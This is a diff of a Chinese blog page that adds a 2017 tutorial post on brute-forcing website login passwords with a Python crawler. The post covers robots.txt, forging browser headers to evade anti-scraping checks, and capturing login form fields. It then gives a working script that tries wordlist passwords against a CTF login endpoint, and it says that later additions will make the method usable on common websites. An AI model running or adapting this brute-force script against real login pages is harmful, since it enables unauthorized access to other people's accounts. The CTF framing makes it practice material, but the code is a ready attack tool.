@@ -258,6 +258,206 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/26/python爬虫暴力破解网站登陆密码（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/06/26/python爬虫暴力破解网站登陆密码（一）/" itemprop="url">
+                  python爬虫暴力破解网站登陆密码（一）
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-26T22:00:01+08:00">
+                2017-06-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/06/26/python爬虫暴力破解网站登陆密码（一）/" class="leancloud_visitors" data-flag-title="python爬虫暴力破解网站登陆密码（一）">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="python爬虫暴力破解网站登陆密码（一）"><a href="#python爬虫暴力破解网站登陆密码（一）" class="headerlink" title="python爬虫暴力破解网站登陆密码（一）"></a>python爬虫暴力破解网站登陆密码（一）</h1><p>本来准备一次写完这篇博客，但是写出主干后发现有很多重要的东西没有提到，所以就分成两篇写，这篇写基础操作，下一篇加上验证码处理和多线程处理模块。  </p>
+<h2 id="0x00-robot-txt"><a href="#0x00-robot-txt" class="headerlink" title="0x00 robot.txt"></a>0x00 robot.txt</h2><p>在写爬虫爬取某个网站之前，我们应该去了解这个网站的robot.txt。那什么是robot.txt呢？简单的说，就是网站的所有者为了让爬虫了解爬取该网站的时候存在哪些限制。虽然这些限制只是建议，但是如果你的爬虫不遵守这些限制，很容易会被网站所封禁。<br>下图为IBM官方网站的robot.txt，我们写爬虫的时候，应该尽量遵守规定。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/a.png" alt="">  </p>
+<p>  下面给出几种写法示例：  </p>
+<ol>
+<li><p>允许所有的robot访问  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Allow: / </span><br><span class="line">或者</span><br><span class="line">User-agent: * </span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>禁止所有搜索引擎访问网站的任何部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>仅禁止Baiduspider访问您的网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>仅允许Baiduspider访问您的网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>禁止spider访问特定目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /tmp/</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="0x01-伪造header"><a href="#0x01-伪造header" class="headerlink" title="0x01 伪造header"></a>0x01 伪造header</h2><p>网站防采集的前提就是要正确地区分人类访问用户和网络机器人，方法之一就是查看你的http请求头，我们为了让自己的爬虫看起来更像是人类用户，就需要对header进行伪造。<br>伪造header成什么样最好呢？当然是伪造成自己手动访问时候的样子最好。这里我们就能用到Firefox中的一个扩展工具——HttpFox（也可以用Chrome开发者模式直接查看），利用这个工具，我们能抓取我们用Firefox访问网站过程的数据包，然后查看这个数据包，就可以看到我们手动访问时的header，然后使用python的requests库进行伪造。<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/b.png" alt="">  </p>
+<p>  代码中hea的部分就可以照着上图写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-填写data并登陆"><a href="#0x02-填写data并登陆" class="headerlink" title="0x02 填写data并登陆"></a>0x02 填写data并登陆</h2><p>既然要破解登陆密码，那前提肯定要做到登陆，我们手动登陆的时候当然是输入账号，输入密码，然后点击提交。可是爬虫工作时，看到的和我们不一样，这个时候账号密码应该怎么传入、登陆操作该怎么进行呢？这个时候再一次用到了Httpfox（同样可以用Chrome开发者模式直接查看），上次我们手动输入时，传入的数据在Httpfox中也被抓取了，照着他的样子填好data，然后我们使用requests中的post命令传入data获取一个cookie，然后再通过cookies访问下一个网站，就实现了爬虫的登陆。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/c.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/d.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/e.png" alt=""><br>如这个网站，两种方法都可以看到要传递的数据，那么填写的时候就要写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'j_username'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'j_password'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'checkCode'</span>: <span class="string">'xxx'</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>这里用一个ctf环境先做一个小脚本进行测试，这道题密码是五位纯数字，生成字典的方法之前破解压缩包的时候已经讲过不在赘述，代码如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/baopo/?yes'</span></span><br><span class="line">data = &#123;<span class="string">'pwd'</span>:<span class="number">123</span>&#125;</span><br><span class="line"></span><br><span class="line">content = requests.post(url,data=data,headers=hea)</span><br><span class="line">content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">recv=content.text</span><br><span class="line"></span><br><span class="line">passFile = open(<span class="string">r'C:\Users\Leticia\Desktop\mutou.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():</span><br><span class="line">    password = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">    data = &#123;<span class="string">'pwd'</span>:password&#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'trying'</span>,password</span><br><span class="line">    content = requests.post(url,data=data)</span><br><span class="line">    content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">    html=content.text</span><br><span class="line">    <span class="keyword">if</span> html != recv:</span><br><span class="line">        <span class="keyword">print</span> html</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/f.png" alt=""><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/g.png" alt="">  </p>
+<p>这个脚本的雏形就有了，可以爆破出结果，但是还存在速度很慢，遇到验证码无法进行等问题，下一节再加上验证码处理和多线程处理的模块,解决了这几个问题，就可以用来处理常见的网站了。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/29/ctf中常见的隐写术/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1584,7 +1784,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">87</span>
+                <span class="site-state-item-count">88</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1648,7 +1848,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
